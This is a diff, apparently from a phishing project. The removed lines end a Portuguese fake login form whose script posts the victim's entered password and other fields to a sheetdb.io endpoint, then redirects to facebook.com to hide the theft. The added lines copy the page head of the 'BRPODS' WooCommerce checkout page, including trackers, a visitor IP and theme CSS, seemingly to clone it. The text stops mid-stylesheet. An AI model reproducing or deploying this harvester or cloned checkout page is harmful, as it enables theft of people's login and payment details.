+var wc_add_to_cart_variation_params = {"wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_no_matching_variations_text":"Desculpe, nenhum produto atende sua sele\u00e7\u00e3o. Escolha uma combina\u00e7\u00e3o diferente.","i18n_make_a_selection_text":"Selecione uma das op\u00e7\u00f5es do produto antes de adicion\u00e1-lo ao carrinho.","i18n_unavailable_text":"Desculpe, este produto n\u00e3o est\u00e1 dispon\u00edvel. Escolha uma combina\u00e7\u00e3o diferente."};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart-variation.js?ver=8.6.1" id="wc-add-to-cart-variation-js" defer="defer" data-wp-strategy="defer"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript"></script><link rel="https://api.w.org/" href="https://brpods.com/wp-json/" /><link rel="alternate" type="application/json" href="https://brpods.com/wp-json/wp/v2/pages/10" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://brpods.com/xmlrpc.php?rsd" />
+<link rel="shortlink" href="https://brpods.com/?p=10" />
+<meta name="google-site-verification" content="NupU5OQWuiVN4Mf8R-gdz1K6Hec8bUNdMOnTnFv8QCo" />
+<script src="https://www.google.com/recaptcha/api.js" type="b19bda5e6f031c08c895a890-text/javascript"></script>
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-KKQK20PQ46" type="b19bda5e6f031c08c895a890-text/javascript"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript">
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-KKQK20PQ46');
+</script>
+
+
+<script data-cfasync="false" data-pagespeed-no-defer>
+	var dataLayer_content = {"visitorLoginState":"logged-out","visitorType":"visitor-logged-out","visitorEmail":"","visitorEmailHash":"","visitorRegistrationDate":"","visitorUsername":"","visitorIP":"200.135.184.21","pageTitle":"Checkout - BRPODS","pagePostType":"page","pagePostType2":"single-page","geoCountryCode":"(no geo data available)","geoCountryName":"(no geo data available)","geoRegionCode":"(no geo data available)","geoRegionName":"(no geo data available)","geoCity":"(no geo data available)","geoZipcode":"(no geo data available)","geoLatitude":"(no geo data available)","geoLongitude":"(no geo data available)","geoFullGeoData":{"success":false,"error":{"code":101,"type":"missing_access_key","info":"You have not supplied an API Access Key. [Required format: access_key=YOUR_ACCESS_KEY]"}},"customerTotalOrders":0,"customerTotalOrderValue":0,"customerFirstName":"","customerLastName":"","customerBillingFirstName":"","customerBillingLastName":"","customerBillingCompany":"","customerBillingAddress1":"","customerBillingAddress2":"","customerBillingCity":"","customerBillingState":"","customerBillingPostcode":"","customerBillingCountry":"","customerBillingEmail":"","customerBillingEmailHash":"","customerBillingPhone":"","customerShippingFirstName":"","customerShippingLastName":"","customerShippingCompany":"","customerShippingAddress1":"","customerShippingAddress2":"","customerShippingCity":"","customerShippingState":"","customerShippingPostcode":"","customerShippingCountry":""};
+	dataLayer.push( dataLayer_content );
+</script>
+<script data-cfasync="false">
+(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-KLTRDHR');
+</script>
+<meta name="theme-color" content> <link rel="shortcut icon" href="https://brpods.com/wp-content/uploads/2019/12/P.png">
+<link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://brpods.com/wp-content/themes/basel/images/icons/apple-touch-icon-152x152-precomposed.png">
+<style> 
+            	
+			/* Shop popup */
+			
+			.basel-promo-popup {
+			   max-width: 900px;
+			}
+	
+            .site-logo {
+                width: 15%;
+            }    
+
+            .site-logo img {
+                max-width: 180px;
+                max-height: 95px;
+            }    
+
+                            .right-column {
+                    width: 280px;
+                }  
             
-            <label for="password">Senha</label>
-            <input type="password" id="password" name="senha" placeholder="Digite sua senha" required>
             
-            <button type="submit">Entrar</button>
-        </form>
-        <script>
-        document.getElementById('Login').onsubmit = function(event) {
-            event.preventDefault(); // Previne o envio padrão do formulário
+			/* header Banner */
+			.header-banner {
+				height: 40px;
+			}
+	
+			.header-banner-display .website-wrapper {
+				margin-top:40px;
+			}	
 
-            const formData = new FormData(this);
-            const data = {};
-            formData.forEach((value, key) => {
-                data[key] = value;
-            });
+            /* Topbar height configs */
 
-            fetch('https://sheetdb.io/api/v1/sukxyvcd371y0', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (response.ok) {
-                    // Dados enviados com sucesso, redireciona para o Facebook
-                    window.location.href = "https://www.facebook.com";
-                } else {
-                    // Trate o erro aqui, se necessário
-                    console.error('Erro ao enviar os dados');
+			.topbar-menu ul > li {
+				line-height: 42px;
+			}
+			
+			.topbar-wrapp,
+			.topbar-content:before {
+				height: 42px;
+			}
+			
+			.sticky-header-prepared.basel-top-bar-on .header-shop, 
+			.sticky-header-prepared.basel-top-bar-on .header-split,
+			.enable-sticky-header.basel-header-overlap.basel-top-bar-on .main-header {
+				top: 42px;
+			}
+
+            /* Header height configs */
+
+            /* Limit logo image height for according to header height */
+            .site-logo img {
+                max-height: 95px;
+            } 
+
+            /* And for sticky header logo also */
+            .act-scroll .site-logo img,
+            .header-clone .site-logo img {
+                max-height: 75px;
+            }   
+
+            /* Set sticky headers height for cloned headers based on menu links line height */
+            .header-clone .main-nav .menu > li > a {
+                height: 75px;
+                line-height: 75px;
+            } 
+
+            /* Height for switch logos */
+
+            .sticky-header-real:not(.global-header-menu-top) .switch-logo-enable .basel-logo {
+                height: 95px;
+            }
+
+            .sticky-header-real:not(.global-header-menu-top) .act-scroll .switch-logo-enable .basel-logo {
+                height: 75px;
+            }
+
+            .sticky-header-real:not(.global-header-menu-top) .act-scroll .switch-logo-enable {
+                transform: translateY(-75px);
+                -webkit-transform: translateY(-75px);
+            }
+
+                            /* Header height for these layouts based on it's menu links line height */
+                .main-nav .menu > li > a {
+                    height: 95px;
+                    line-height: 95px;
+                }  
+                /* The same for sticky header */
+                .act-scroll .main-nav .menu > li > a {
+                    height: 75px;
+                    line-height: 75px;
+                }  
+            
+            
+            
+            
+            /* Page headings settings for heading overlap. Calculate on the header height base */
+
+            .basel-header-overlap .title-size-default,
+            .basel-header-overlap .title-size-small,
+            .basel-header-overlap .title-shop.without-title.title-size-default,
+            .basel-header-overlap .title-shop.without-title.title-size-small {
+                padding-top: 135px;
+            }
+
+
+            .basel-header-overlap .title-shop.without-title.title-size-large,
+            .basel-header-overlap .title-size-large {
+                padding-top: 215px;
+            }
+
+            @media (max-width: 991px) {
+
+				/* header Banner */
+				.header-banner {
+					height: 40px;
+				}
+	
+				.header-banner-display .website-wrapper {
+					margin-top:40px;
+				}
+
+	            /* Topbar height configs */
+				.topbar-menu ul > li {
+					line-height: 38px;
+				}
+				
+				.topbar-wrapp,
+				.topbar-content:before {
+					height: 38px;
+				}
+				
+				.sticky-header-prepared.basel-top-bar-on .header-shop, 
+				.sticky-header-prepared.basel-top-bar-on .header-split,
+				.enable-sticky-header.basel-header-overlap.basel-top-bar-on .main-header {
+					top: 38px;
+				}
+
+                /* Set header height for mobile devices */
+                .main-header .wrapp-header {
+                    min-height: 60px;
+                } 
+
+                /* Limit logo image height for mobile according to mobile header height */
+                .site-logo img {
+                    max-height: 60px;
+                }   
+
+                /* Limit logo on sticky header. Both header real and header cloned */
+                .act-scroll .site-logo img,
+                .header-clone .site-logo img {
+                    max-height: 60px;
                 }
-            })
-            .catch(error => {
-                console.error('Erro de rede:', error);
-            });
-        };
-        </script> 
-    </div>
 
-</body>
+                /* Height for switch logos */
+
+                .main-header .switch-logo-enable .basel-logo {
+                    height: 60px;
+                }
+
+                .sticky-header-real:not(.global-header-menu-top) .act-scroll .switch-logo-enable .basel-logo {
+                    height: 60px;
+                }
+
+                .sticky-header-real:not(.global-header-menu-top) .act-scroll .switch-logo-enable {
+                    transform: translateY(-60px);
+                    -webkit-transform: translateY(-60px);
+                }
+
+                /* Page headings settings for heading overlap. Calculate on the MOBILE header height base */
+                .basel-header-overlap .title-size-default,
+                .basel-header-overlap .title-size-small,
+                .basel-header-overlap .title-shop.without-title.title-size-default,
+                .basel-header-overlap .title-shop.without-title.title-size-small {
+                    padding-top: 80px;
+                }
+
+                .basel-header-overlap .title-shop.without-title.title-size-large,
+                .basel-header-overlap .title-size-large {
+                    padding-top: 120px;
+                }
+ 
+            }
+
+                 
+                    </style>
+<noscript><style>.woocommerce-product-gallery{ opacity: 1 !important; }</style></noscript>
+<meta name="generator" content="Elementor 3.19.4; features: e_optimized_assets_loading, additional_custom_breakpoints, block_editor_assets_optimize, e_image_loading_optimization; settings: css_print_method-external, google_font-enabled, font_display-auto">
+<meta name="generator" content="Powered by WPBakery Page Builder - drag and drop page builder for WordPress." />
+<style data-type="vc_custom-css">#billing_neighborhood_field {
+    width:100%;
+}
+
+#billing_city_field {
+    width:100%;   
+}</style> <style type="text/css" id="wp-custom-css">
+			.outofstock img,.outofstock .product-element-top img{
+	filter: grayscale(1) !important;
+}
+.sticky-header > .container{
+	max-width: 1500px !important;
+  margin: auto !important;
+}
+#shipping_method li {
+  margin-bottom: 10px;
+  border: 1px solid #ddd;
+  display: flex;
+  padding: 10px;
+	flex-wrap:wrap;
+}
+.woocommerce-error{
+	margin-top: 10px !important;
+margin-left: 0 !important;
+}
+#carrossel-home-mobile,.carrossel-home-mobile{
+	display:none !important;
+}
+ @media only screen and (max-width: 600px) {
+	 .carrossel-home{
+		 display:none !important;
+	 }
+	 .carrossel-home-mobile{
+		 display:block !important;
+	 }
+}
+#banner-principal{
+	margin-bottom:30px;
+}
+#banner-principal ul.slides{
+
+	max-width:2000px !important;
+	margin:auto !important;
+	margin-bottom:-50px !important;
+}
+#foto-banner-principal{
+		margin: auto !important;
+    max-width: 1460px !important;
+    
+}
+.owl-carousel-item-inner{
+	text-align:center !important;
+}
+.main-header{
+		
+		max-width: 2110px !important;
+    margin: auto !important;
+    margin-bottom: 40px !important;
+}
+.product-labels{
+	max-width:100% !important;
+	min-width: 100%;
+  padding-right: 0px;
+	min-height:61px!important;
+}
+@media only screen and (max-width: 600px) {
+	.basel-search-wrapper{
+		display:none !important;
+	}
+}
+.labels-rounded .out-of-stock{
+	max-width:100%;
+	width:99%;
+	position:absolute !important;
+	top:200% !important;
+	left:-4px;
+	margin-left:1px;
+	background:#fff !important;
+	color:red !important;
+	box-shadow:1px 1px 6px rgba(0,0,0,.1);
+	font-size:15px;
+}
+ @media only screen and (max-width: 500px) {
+
+	 .xoo-cp-remove,.xoo-cp-pqty{
+		 display:none !important;
+	 }
+	 td.xoo-cp-pimg{
+		 display:inline !important;
+	 }
+}
+.mp-wallet-button-container{
+	display:none !important;
+}		</style>
+<style data-type="basel-dynamic-css">.page-title-default{background-color:#212121;background-size:cover;background-position:center center;}.topbar-wrapp{background-color:#1aada3;}.main-header{border-style:solid;}.footer-container{background-color:#000000;}body, p, .widget_nav_mega_menu .menu > li > a, 
+.mega-navigation .menu > li > a,
+.basel-navigation .menu > li.menu-item-design-full-width .sub-sub-menu li a, 
+.basel-navigation .menu > li.menu-item-design-sized .sub-sub-menu li a,
+.basel-navigation .menu > li.menu-item-design-default .sub-menu li a,
+.font-default
+		{font-family: "Roboto", Arial, Helvetica, sans-serif;font-weight: 400;font-size: 16px;}h1 a, h2 a, h3 a, h4 a, h5 a, h6 a, h1, h2, h3, h4, h5, h6, .title, table th,
+.wc-tabs li a,
+.masonry-filter li a,
+.woocommerce .cart-empty,
+.basel-navigation .menu > li.menu-item-design-full-width .sub-menu > li > a, 
+.basel-navigation .menu > li.menu-item-design-sized .sub-menu > li > a,
+.mega-menu-list > li > a,
+fieldset legend,
+table th,
+.basel-empty-compare,
+.compare-field,
+.compare-value:before,
+.color-scheme-dark .info-box-inner h1,
+.color-scheme-dark .info-box-inner h2,
+.color-scheme-dark .info-box-inner h3,
+.color-scheme-dark .info-box-inner h4,
+.color-scheme-dark .info-box-inner h5,
+.color-scheme-dark .info-box-inner h6
+
+		{font-family: "Roboto", Arial, Helvetica, sans-serif;font-weight: 500;font-size: 24px;}
+
+.product-title a,
+.post-slide .entry-title a,
+.category-grid-item .hover-mask h3,
+.basel-search-full-screen .basel-search-inner input[type="text"],
+.blog-post-loop .entry-title,
+.post-title-large-image .entry-title,
+.single-product-content .entry-title
+		{font-family: "Roboto", Arial, Helvetica, sans-serif;font-weight: 500;font-size: 24px;}.title-alt, .subtitle, .font-alt, .basel-entry-meta{font-family: "Roboto", Arial, Helvetica, sans-serif;font-weight: 400;}.widgettitle, .widget-title{font-family: "Roboto", Arial, Helvetica, sans-serif;font-weight: 400;font-size: 16px;}.main-nav .menu > li > a{font-family: "Roboto", Arial, Helvetica, sans-serif;font-weight: 300;font-size: 13px;}.color-primary,.mobile-nav ul li.current-menu-item > a,.main-nav .menu > li.current-menu-item > a,.main-nav .menu > li.onepage-link.current-menu-item > a,.main-nav .menu > li > a:hover,.main-nav .menu > li > a:focus,.basel-navigation .menu>li.menu-item-design-default ul li:hover>a,.basel-navigation .menu > li.menu-item-design-full-width .sub-menu li a:hover, .basel-navigation .menu > li.menu-item-design-sized .sub-menu li a:hover,.basel-product-categories.responsive-cateogires li.current-cat > a, .basel-product-categories.responsive-cateogires li.current-cat-parent > a,.basel-product-categories.responsive-cateogires li.current-cat-ancestor > a,.basel-my-account-links a:hover:before, .basel-my-account-links a:focus:before,.mega-menu-list > li > a:hover,.mega-menu-list .sub-sub-menu li a:hover,a[href^=tel],.topbar-menu ul > li > .sub-menu-dropdown li > a:hover,.btn.btn-color-primary.btn-style-bordered,.button.btn-color-primary.btn-style-bordered,button.btn-color-primary.btn-style-bordered,.added_to_cart.btn-color-primary.btn-style-bordered,input[type=submit].btn-color-primary.btn-style-bordered,a.login-to-prices-msg,a.login-to-prices-msg:hover,.basel-dark .single-product-content .entry-summary .yith-wcwl-add-to-wishlist .yith-wcwl-wishlistaddedbrowse a:before, .basel-dark .single-product-content .entry-summary .yith-wcwl-add-to-wishlist .yith-wcwl-wishlistexistsbrowse a:before,.basel-dark .read-more-section .btn-read-more,.basel-dark .basel-load-more,.basel-dark .color-primary,.basel-hover-link .swap-elements .btn-add a,.basel-hover-link .swap-elements .btn-add a:hover,.basel-hover-link .swap-elements .btn-add a:focus,.blog-post-loop .entry-title a:hover,.blog-post-loop.sticky .entry-title:before,.post-slide .entry-title a:hover,.comments-area .reply a,.single-post-navigation a:hover,blockquote footer:before,blockquote cite,.format-quote .entry-content blockquote cite, .format-quote .entry-content blockquote cite a,.basel-entry-meta .meta-author a,.search-no-results.woocommerce .site-content:before,.search-no-results .not-found .entry-header:before,.login-form-footer .lost_password:hover, .login-form-footer .lost_password:focus,.error404 .page-title,.menu-label-new:after,.widget_shopping_cart .product_list_widget li .quantity .amount,.product_list_widget li ins .amount,.price ins > .amount,.price ins,.single-product .price,.single-product .price .amount,.popup-quick-view .price,.popup-quick-view .price .amount,.basel-products-nav .product-short .price,.basel-products-nav .product-short .price .amount,.star-rating span:before,.comment-respond .stars a:hover:after,.comment-respond .stars a.active:after,.single-product-content .comment-form .stars span a:hover,.single-product-content .comment-form .stars span a.active,.tabs-layout-accordion .basel-tab-wrapper .basel-accordion-title:hover,.tabs-layout-accordion .basel-tab-wrapper .basel-accordion-title.active,.single-product-content .woocommerce-product-details__short-description ul > li:before, .single-product-content #tab-description ul > li:before, .blog-post-loop .entry-content ul > li:before, .comments-area .comment-list li ul > li:before,.brands-list .brand-item a:hover,.footer-container .footer-widget-collapse.footer-widget-opened .widget-title:after,.sidebar-widget li a:hover, .filter-widget li a:hover,.sidebar-widget li > ul li a:hover, .filter-widget li > ul li a:hover,.basel-price-filter ul li a:hover .amount,.basel-hover-effect-4 .swap-elements > a,.basel-hover-effect-4 .swap-elements > a:hover,.product-grid-item .basel-product-cats a:hover, .product-grid-item .basel-product-brands-links a:hover,.wishlist_table tr td.product-price ins .amount,.basel-buttons .product-compare-button > a.added:before,.basel-buttons .basel-wishlist-btn > a.added:before,.single-product-content .entry-summary .yith-wcwl-add-to-wishlist a:hover,.single-product-content .container .entry-summary .yith-wcwl-add-to-wishlist a:hover:before,.single-product-content .entry-summary .yith-wcwl-add-to-wishlist .yith-wcwl-wishlistaddedbrowse a:before, .single-product-content .entry-summary .yith-wcwl-add-to-wishlist .yith-wcwl-wishlistexistsbrowse a:before,.single-product-content .entry-summary .yith-wcwl-add-to-wishlist .yith-wcwl-add-button.feid-in > a:before,.basel-sticky-btn .basel-sticky-btn-wishlist a.added, .basel-sticky-btn .basel-sticky-btn-wishlist a:hover,.single-product-content .entry-summary .wishlist-btn-wrapper a:hover,.single-product-content .entry-summary .wishlist-btn-wrapper a:hover:before,.single-product-content .entry-summary .wishlist-btn-wrapper a.added:before,.vendors-list ul li a:hover,.product-list-item .product-list-buttons .basel-wishlist-btn a:hover,.product-list-item .product-list-buttons .basel-wishlist-btn a:focus, .product-list-item .product-list-buttons .product-compare-button a:hover,.product-list-item .product-list-buttons .product-compare-button a:focus,.product-list-item .product-list-buttons .basel-wishlist-btn > a.added:before,.product-list-item .product-list-buttons .product-compare-button > a.added:before,.basel-sticky-btn .basel-sticky-btn-compare a.added, .basel-sticky-btn .basel-sticky-btn-compare a:hover,.single-product-content .entry-summary .compare-btn-wrapper a:hover,.single-product-content .entry-summary .compare-btn-wrapper a:hover:before,.single-product-content .entry-summary .compare-btn-wrapper a.added:before,.single-product-content .entry-summary .basel-sizeguide-btn:hover,.single-product-content .entry-summary .basel-sizeguide-btn:hover:before,.blog-post-loop .entry-content ul li:before,.basel-menu-price .menu-price-price,.basel-menu-price.cursor-pointer:hover .menu-price-title,.comments-area #cancel-comment-reply-link:hover,.comments-area .comment-body .comment-edit-link:hover,.popup-quick-view .entry-summary .entry-title a:hover,.wpb_text_column ul:not(.social-icons) > li:before,.widget_product_categories .basel-cats-toggle:hover,.widget_product_categories .toggle-active,.widget_product_categories li.current-cat-parent > a, .widget_product_categories li.current-cat > a,.woocommerce-checkout-review-order-table tfoot .order-total td .amount,.widget_shopping_cart .product_list_widget li .remove:hover,.basel-active-filters .widget_layered_nav_filters ul li a .amount,.title-wrapper.basel-title-color-primary .title-subtitle,.widget_shopping_cart .widget_shopping_cart_content > .total .amount,.color-scheme-light .vc_tta-tabs.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tab.vc_active > a,.wpb-js-composer .vc_tta.vc_general.vc_tta-style-classic .vc_tta-tab.vc_active > a{color:#3a9f4f;}.wishlist-info-widget .wishlist-count,.basel-toolbar-compare .compare-count,.basel-cart-design-2 > a .basel-cart-number,.basel-cart-design-3 > a .basel-cart-number,.basel-sticky-sidebar-opener:not(.sticky-toolbar):hover,.basel-sticky-sidebar-opener:not(.sticky-toolbar):focus,.btn.btn-color-primary,.button.btn-color-primary,button.btn-color-primary,.added_to_cart.btn-color-primary,input[type=submit].btn-color-primary,.btn.btn-color-primary:hover, .btn.btn-color-primary:focus, .button.btn-color-primary:hover, .button.btn-color-primary:focus, button.btn-color-primary:hover, button.btn-color-primary:focus, .added_to_cart.btn-color-primary:hover, .added_to_cart.btn-color-primary:focus, input[type=submit].btn-color-primary:hover, input[type=submit].btn-color-primary:focus,.btn.btn-color-primary.btn-style-bordered:hover,.btn.btn-color-primary.btn-style-bordered:focus,.button.btn-color-primary.btn-style-bordered:hover,.button.btn-color-primary.btn-style-bordered:focus,button.btn-color-primary.btn-style-bordered:hover,button.btn-color-primary.btn-style-bordered:focus,.added_to_cart.btn-color-primary.btn-style-bordered:hover,.added_to_cart.btn-color-primary.btn-style-bordered:focus,input[type=submit].btn-color-primary.btn-style-bordered:hover,input[type=submit].btn-color-primary.btn-style-bordered:focus,.widget_shopping_cart .widget_shopping_cart_content .buttons .checkout,.widget_shopping_cart .widget_shopping_cart_content .buttons .checkout:hover, .widget_shopping_cart .widget_shopping_cart_content .buttons .checkout:focus,.basel-search-dropdown .basel-search-wrapper .basel-search-inner form button,.basel-search-dropdown .basel-search-wrapper .basel-search-inner form button:hover,.basel-search-dropdown .basel-search-wrapper .basel-search-inner form button:focus,.no-results .searchform #searchsubmit,.no-results .searchform #searchsubmit:hover,.no-results .searchform #searchsubmit:focus,.comments-area .comment-respond input[type=submit],.comments-area .comment-respond input[type=submit]:hover,.comments-area .comment-respond input[type=submit]:focus,.woocommerce .cart-collaterals .cart_totals .wc-proceed-to-checkout > a.button,.woocommerce .cart-collaterals .cart_totals .wc-proceed-to-checkout > a.button:hover,.woocommerce .cart-collaterals .cart_totals .wc-proceed-to-checkout > a.button:focus,.woocommerce .checkout_coupon .button,.woocommerce .checkout_coupon .button:hover,.woocommerce .checkout_coupon .button:focus,.woocommerce .place-order button,.woocommerce .place-order button:hover,.woocommerce .place-order button:focus,.woocommerce-order-pay #order_review .button,.woocommerce-order-pay #order_review .button:hover,.woocommerce-order-pay #order_review .button:focus,.woocommerce input[name=track],.woocommerce input[name=track]:hover,.woocommerce input[name=track]:focus,.woocommerce input[name=save_account_details],.woocommerce input[name=save_address],.woocommerce-page input[name=save_account_details],.woocommerce-page input[name=save_address],.woocommerce input[name=save_account_details]:hover,.woocommerce input[name=save_account_details]:focus,.woocommerce input[name=save_address]:hover,.woocommerce input[name=save_address]:focus,.woocommerce-page input[name=save_account_details]:hover,.woocommerce-page input[name=save_account_details]:focus,.woocommerce-page input[name=save_address]:hover,.woocommerce-page input[name=save_address]:focus,.search-no-results .not-found .entry-content .searchform #searchsubmit,.search-no-results .not-found .entry-content .searchform #searchsubmit:hover, .search-no-results .not-found .entry-content .searchform #searchsubmit:focus,.error404 .page-content > .searchform #searchsubmit,.error404 .page-content > .searchform #searchsubmit:hover,.error404 .page-content > .searchform #searchsubmit:focus,.return-to-shop .button,.return-to-shop .button:hover,.return-to-shop .button:focus,.basel-hover-excerpt .btn-add a,.basel-hover-excerpt .btn-add a:hover,.basel-hover-excerpt .btn-add a:focus,.basel-hover-standard .btn-add > a,.basel-hover-standard .btn-add > a:hover,.basel-hover-standard .btn-add > a:focus,.basel-price-table .basel-plan-footer > a,.basel-price-table .basel-plan-footer > a:hover, .basel-price-table .basel-plan-footer > a:focus,.basel-pf-btn button,.basel-pf-btn button:hover,.basel-pf-btn button:focus,.basel-info-box.box-style-border .info-btn-wrapper a,.basel-info-box.box-style-border .info-btn-wrapper a:hover,.basel-info-box.box-style-border .info-btn-wrapper a:focus,.basel-info-box2.box-style-border .info-btn-wrapper a,.basel-info-box2.box-style-border .info-btn-wrapper a:hover,.basel-info-box2.box-style-border .info-btn-wrapper a:focus,.basel-hover-quick .woocommerce-variation-add-to-cart .button,.basel-hover-quick .woocommerce-variation-add-to-cart .button:hover, .basel-hover-quick .woocommerce-variation-add-to-cart .button:focus,.product-list-item .product-list-buttons > a,.product-list-item .product-list-buttons > a:hover,.product-list-item .product-list-buttons > a:focus,.wpb_video_wrapper .button-play,.basel-navigation .menu > li.callto-btn > a,.basel-navigation .menu > li.callto-btn > a:hover,.basel-navigation .menu > li.callto-btn > a:focus,.basel-dark .basel-load-more:hover,.basel-dark .basel-load-more:focus,.basel-dark .basel-load-more.load-on-click + .basel-load-more-loader,.basel-dark .feedback-form .wpcf7-submit, .basel-dark .mc4wp-form input[type=submit], .basel-dark .single_add_to_cart_button,.basel-dark .basel-compare-col .add_to_cart_button,.basel-dark .basel-compare-col .added_to_cart,.basel-dark .basel-sticky-btn .basel-sticky-add-to-cart,.basel-dark .single-product-content .comment-form .form-submit input[type=submit],.basel-dark .basel-registration-page .basel-switch-to-register, .basel-dark .register .button, .basel-dark .login .button, .basel-dark .lost_reset_password .button, .basel-dark .wishlist_table tr td.product-add-to-cart > .add_to_cart.button, .basel-dark .woocommerce .cart-actions .coupon .button,.basel-dark .feedback-form .wpcf7-submit:hover, .basel-dark .mc4wp-form input[type=submit]:hover, .basel-dark .single_add_to_cart_button:hover,.basel-dark .basel-compare-col .add_to_cart_button:hover,.basel-dark .basel-compare-col .added_to_cart:hover,.basel-dark .basel-sticky-btn .basel-sticky-add-to-cart:hover,.basel-dark .single-product-content .comment-form .form-submit input[type=submit]:hover,.basel-dark .basel-registration-page .basel-switch-to-register:hover, .basel-dark .register .button:hover, .basel-dark .login .button:hover, .basel-dark .lost_reset_password .button:hover, .basel-dark .wishlist_table tr td.product-add-to-cart > .add_to_cart.button:hover,.basel-dark .woocommerce .cart-actions .coupon .button:hover,.basel-ext-primarybtn-dark:focus, .basel-dark .feedback-form .wpcf7-submit:focus,.basel-dark .mc4wp-form input[type=submit]:focus, .basel-dark .single_add_to_cart_button:focus,.basel-dark .basel-compare-col .add_to_cart_button:focus,.basel-dark .basel-compare-col .added_to_cart:focus,.basel-dark .basel-sticky-btn .basel-sticky-add-to-cart:focus,.basel-dark .single-product-content .comment-form .form-submit input[type=submit]:focus,.basel-dark .basel-registration-page .basel-switch-to-register:focus, .basel-dark .register .button:focus, .basel-dark .login .button:focus, .basel-dark .lost_reset_password .button:focus, .basel-dark .wishlist_table tr td.product-add-to-cart > .add_to_cart.button:focus,.basel-dark .woocommerce .cart-actions .coupon .button:focus,.basel-stock-progress-bar .progress-bar,.widget_price_filter .ui-slider .ui-slider-handle:after,.widget_price_filter .ui-slider .ui-slider-range,.widget_tag_cloud .tagcloud a:hover,.widget_product_tag_cloud .tagcloud a:hover,div.bbp-submit-wrapper button,div.bbp-submit-wrapper button:hover,div.bbp-submit-wrapper button:focus,#bbpress-forums .bbp-search-form #bbp_search_submit,#bbpress-forums .bbp-search-form #bbp_search_submit:hover,#bbpress-forums .bbp-search-form #bbp_search_submit:focus,body .select2-container--default .select2-results__option--highlighted[aria-selected], .basel-add-img-msg:before,.product-video-button a:hover:before, .product-360-button a:hover:before,.mobile-nav ul li .up-icon,.scrollToTop:hover, .scrollToTop:focus,.basel-sticky-filter-btn:hover, .basel-sticky-filter-btn:focus,.categories-opened li a:active,.basel-price-table .basel-plan-price,.header-categories .secondary-header .mega-navigation,.widget_nav_mega_menu,.meta-post-categories,.slider-title:before,.title-wrapper.basel-title-style-simple .title:after,.menu-label-new,.product-label.onsale,.color-scheme-light .vc_tta-tabs.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tab.vc_active > a span:after,.wpb-js-composer .vc_tta.vc_general.vc_tta-style-classic .vc_tta-tab.vc_active > a span:after,.portfolio-with-bg-alt .portfolio-entry:hover .entry-header > .portfolio-info{background-color:#3a9f4f;}.btn.btn-color-primary,.button.btn-color-primary,button.btn-color-primary,.added_to_cart.btn-color-primary,input[type=submit].btn-color-primary,.btn.btn-color-primary:hover, .btn.btn-color-primary:focus, .button.btn-color-primary:hover, .button.btn-color-primary:focus, button.btn-color-primary:hover, button.btn-color-primary:focus, .added_to_cart.btn-color-primary:hover, .added_to_cart.btn-color-primary:focus, input[type=submit].btn-color-primary:hover, input[type=submit].btn-color-primary:focus,.btn.btn-color-primary.btn-style-bordered:hover,.btn.btn-color-primary.btn-style-bordered:focus,.button.btn-color-primary.btn-style-bordered:hover,.button.btn-color-primary.btn-style-bordered:focus,button.btn-color-primary.btn-style-bordered:hover,button.btn-color-primary.btn-style-bordered:focus,.widget_shopping_cart .widget_shopping_cart_content .buttons .checkout,.widget_shopping_cart .widget_shopping_cart_content .buttons .checkout:hover,.widget_shopping_cart .widget_shopping_cart_content .buttons .checkout:focus,.basel-search-dropdown .basel-search-wrapper .basel-search-inner form button,.basel-search-dropdown .basel-search-wrapper .basel-search-inner form button:hover,.basel-search-dropdown .basel-search-wrapper .basel-search-inner form button:focus,.comments-area .comment-respond input[type=submit],.comments-area .comment-respond input[type=submit]:hover,.comments-area .comment-respond input[type=submit]:focus,.sidebar-container .mc4wp-form input[type=submit],.sidebar-container .mc4wp-form input[type=submit]:hover,.sidebar-container .mc4wp-form input[type=submit]:focus,.footer-container .mc4wp-form input[type=submit],.footer-container .mc4wp-form input[type=submit]:hover,.footer-container .mc4wp-form input[type=submit]:focus,.filters-area .mc4wp-form input[type=submit],.filters-area .mc4wp-form input[type=submit]:hover,.filters-area .mc4wp-form input[type=submit]:focus,.woocommerce .cart-collaterals .cart_totals .wc-proceed-to-checkout > a.button,.woocommerce .cart-collaterals .cart_totals .wc-proceed-to-checkout > a.button:hover,.woocommerce .cart-collaterals .cart_totals .wc-proceed-to-checkout > a.button:focus,.woocommerce .checkout_coupon .button,.woocommerce .checkout_coupon .button:hover,.woocommerce .checkout_coupon .button:focus,.woocommerce .place-order button,.woocommerce .place-order button:hover,.woocommerce .place-order button:focus,.woocommerce-order-pay #order_review .button,.woocommerce-order-pay #order_review .button:hover,.woocommerce-order-pay #order_review .button:focus,.woocommerce input[name=track],.woocommerce input[name=track]:hover,.woocommerce input[name=track]:focus,.woocommerce input[name=save_account_details],.woocommerce input[name=save_address],.woocommerce-page input[name=save_account_details],.woocommerce-page input[name=save_address],.woocommerce input[name=save_account_details]:hover,.woocommerce input[name=save_account_details]:focus, .woocommerce input[name=save_address]:hover, .woocommerce input[name=save_address]:focus, .woocommerce-page input[name=save_account_details]:hover, .woocommerce-page input[name=save_account_details]:focus, .woocommerce-page input[name=save_address]:hover, .woocommerce-page input[name=save_address]:focus,.search-no-results .not-found .entry-content .searchform #searchsubmit,.search-no-results .not-found .entry-content .searchform #searchsubmit:hover, .search-no-results .not-found .entry-content .searchform #searchsubmit:focus,.error404 .page-content > .searchform #searchsubmit,.error404 .page-content > .searchform #searchsubmit:hover, .error404 .page-content > .searchform #searchsubmit:focus,.no-results .searchform 